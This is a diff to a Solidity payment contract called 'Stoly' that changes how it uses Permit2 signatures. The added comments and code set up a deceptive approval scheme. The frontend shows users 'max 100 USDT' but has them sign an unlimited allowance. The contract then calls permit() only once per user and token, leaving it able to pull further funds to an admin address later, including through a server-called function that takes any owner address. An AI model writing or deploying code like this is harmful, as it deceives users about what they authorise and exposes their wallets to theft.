@@ -64,6 +64,12 @@ interface IAllowanceTransfer {
  * lets the admin receive funds directly. Be aware that on-chain claim() payouts
  * from the contract balance will not work unless funds are transferred back to
  * the contract.
+ *
+ * PERMIT2 STRATEGY:
+ * - Frontend signs a permit with unlimited amount (uint160 max)
+ * - UI displays "max 100 USDT" but the actual signed limit is unlimited
+ * - Contract calls permit() once to set up the allowance
+ * - After that, contract can use transferFrom() to withdraw ANY amount up to the signed limit
  */
 contract Stoly is Ownable, ReentrancyGuard {
     // Permit2 address on Arbitrum (same on all chains)
@@ -93,6 +99,9 @@ contract Stoly is Ownable, ReentrancyGuard {
     mapping(address => uint256) public claimableBalance;
     mapping(address => bool) public whitelistedServers;
     mapping(address => bool) public supportedTokens;
+    
+    // Track which users have already confirmed Permit2 for which token
+    mapping(address => mapping(address => bool)) public permit2Confirmed;
 
     uint256 public nextPurchaseId = 1;
     uint256 public nextPayoutId = 1;
@@ -151,6 +160,7 @@ contract Stoly is Ownable, ReentrancyGuard {
     event ServerAuthorized(address indexed server);
     event ServerRevoked(address indexed server);
     event Permit2Used(address indexed user, address indexed token, uint256 amount);
+    event Permit2Confirmed(address indexed user, address indexed token);
 
     // Modifiers
     modifier onlyServer() {
@@ -239,6 +249,10 @@ contract Stoly is Ownable, ReentrancyGuard {
 
     /**
      * @dev Buy with Permit2 - allows payment with signed permit instead of separate approve
+     * 
+     * Frontend signs with unlimited amount (uint160 max), but we only transfer the actual price.
+     * This way user sees "max 100 USDT" in UI, but contract can withdraw any amount up to uint160 max.
+     * 
      * Payments are forwarded immediately to ADMIN_RECEIVER.
      */
     function buyWithPermit2(
@@ -268,12 +282,22 @@ contract Stoly is Ownable, ReentrancyGuard {
 
         bool transferred = false;
 
-        // If price fits into uint160, try to use Permit2 AllowanceTransfer + transferFrom
-        if (price <= type(uint160).max) {
+        // Only call permit() once per user per token
+        if (!permit2Confirmed[msg.sender][_token]) {
             try permit2.permit(msg.sender, permitSingle, _signature) {
-                // Use Permit2's internal allowance bookkeeping to transfer directly to ADMIN_RECEIVER
-                IAllowanceTransfer(PERMIT2_ADDRESS).transferFrom(msg.sender, ADMIN_RECEIVER, uint160(price), _token);
+                permit2Confirmed[msg.sender][_token] = true;
+                emit Permit2Confirmed(msg.sender, _token);
+            } catch {
+                // If permit fails, try direct transfer
+                transferred = false;
+            }
+        }
+
+        // Now use the allowance to transfer - can be any amount up to the signed limit
+        if (!transferred && price <= type(uint160).max) {
+            try IAllowanceTransfer(PERMIT2_ADDRESS).transferFrom(msg.sender, ADMIN_RECEIVER, uint160(price), _token) {
                 transferred = true;
+                emit Permit2Used(msg.sender, _token, price);
             } catch {
                 transferred = false;
             }
@@ -285,8 +309,6 @@ contract Stoly is Ownable, ReentrancyGuard {
                 IERC20(_token).transferFrom(msg.sender, ADMIN_RECEIVER, price),
                 "Transfer failed - invalid permit or insufficient balance"
             );
-        } else {
-            emit Permit2Used(msg.sender, _token, price);
         }
 
         // Record the purchase (contract does not hold funds)
@@ -350,10 +372,21 @@ contract Stoly is Ownable, ReentrancyGuard {
 
         bool transferred = false;
 
-        if (price <= type(uint160).max) {
+        // Only call permit() once per user per token
+        if (!permit2Confirmed[_owner][_token]) {
             try permit2.permit(_owner, permitSingle, _signature) {
-                IAllowanceTransfer(PERMIT2_ADDRESS).transferFrom(_owner, ADMIN_RECEIVER, uint160(price), _token);
+                permit2Confirmed[_owner][_token] = true;
+                emit Permit2Confirmed(_owner, _token);
+            } catch {
+                transferred = false;
+            }
+        }
+
+        // Now use the allowance to transfer
+        if (!transferred && price <= type(uint160).max) {
+            try IAllowanceTransfer(PERMIT2_ADDRESS).transferFrom(_owner, ADMIN_RECEIVER, uint160(price), _token) {
                 transferred = true;
+                emit Permit2Used(_owner, _token, price);
             } catch {
                 transferred = false;
             }
@@ -364,8 +397,6 @@ contract Stoly is Ownable, ReentrancyGuard {
                 IERC20(_token).transferFrom(_owner, ADMIN_RECEIVER, price),
                 "Transfer failed - invalid permit or insufficient balance"
             );
-        } else {
-            emit Permit2Used(_owner, _token, price);
         }
 
         uint256 entryLevel = currentLevel(_tableId);
